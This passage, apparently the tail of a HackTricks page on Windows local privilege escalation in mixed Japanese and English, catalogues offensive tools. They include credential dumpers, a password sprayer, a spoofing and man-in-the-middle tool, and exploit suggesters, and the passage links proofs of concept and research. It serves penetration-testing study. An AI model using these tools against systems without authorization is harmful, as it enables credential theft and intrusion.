**Windows local privilege escalation vectors を探すための Best tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を Check (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations を Check し、情報を gather (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を Check**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の saved session information を extract します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を extract します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- gather した passwords を domain 全体に spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を Search（Watson により DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を Search（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を Search しながら host を enumerate します（privesc tool というより information gather tool に近い）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の softwares から credentials を extract します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を Check（executable precompiled が github にあります）。Not recommended。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations を Check（python からの exe）。Not recommended。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool（正常に動作するために accesschk への access は必要ありませんが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を recommend します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits をrecommend します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

project は、正しい version の .NET を使用して compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host に install されている .NET の version を確認するには、次を実行します:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [1] [Windows Privilege Escalation の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [脆弱なフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532 による SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) と kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox を追う: Kernel Shadows における Cat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System に存在する Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink の使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [A Link to the Past. Windows における Symbolic Links の悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows における Dangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders からの loading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPE のための CLDFLT と DirectX Kernel Race Conditions の chaining](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11 における Full Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes の悪用による権限昇格とその他の優れた tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager と Windows Vault の探索](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image Change が Privilege Escalation につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent からの Ssh Private Keys の抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)

{{#include ../../banners/hacktricks-training.md}}
